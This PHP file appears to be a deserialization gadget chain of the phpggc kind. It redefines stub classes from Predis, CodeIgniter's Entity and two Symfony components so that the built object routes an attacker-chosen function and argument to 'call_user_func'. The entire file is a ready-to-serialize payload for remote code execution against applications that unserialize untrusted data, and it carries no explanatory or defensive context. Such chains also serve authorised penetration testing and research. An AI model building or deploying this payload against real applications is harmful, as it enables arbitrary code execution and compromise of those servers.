<?php

namespace Predis\Connection
{
    class StreamConnection
    {
        protected $parameters;

        function __construct($function, $paramter)
        {
            $this->parameters = new \CodeIgniter\Entity\Entity($function, $paramter);
        }
    }
}

namespace CodeIgniter\Entity
{
    class Entity
    {
        protected $datamap;

        function __construct($function, $parameter)
        {
            $this->datamap = ["persistent" => new \Symfony\Component\HttpFoundation\Request($function, $parameter)];
        }
    }
}

namespace Symfony\Component\HttpFoundation
{
    class Request
    {
        public $server;
        public $cookies;

        function __construct($function, $paramter)
        {
            $this->cookies = ["key" => "value"];
            $this->server = new \Symfony\Component\DependencyInjection\Argument\ServiceLocator($function, $paramter);
        }
    }
}

namespace Symfony\Component\DependencyInjection\Argument
{
    class ServiceLocator
    {
        private $serviceMap;
        private $factory;

        function __construct($function, $paramter)
        {
            $this->factory = "call_user_func";
            $this->serviceMap = ["REQUEST_METHOD" => [$function, $paramter]];
        }
    }
}
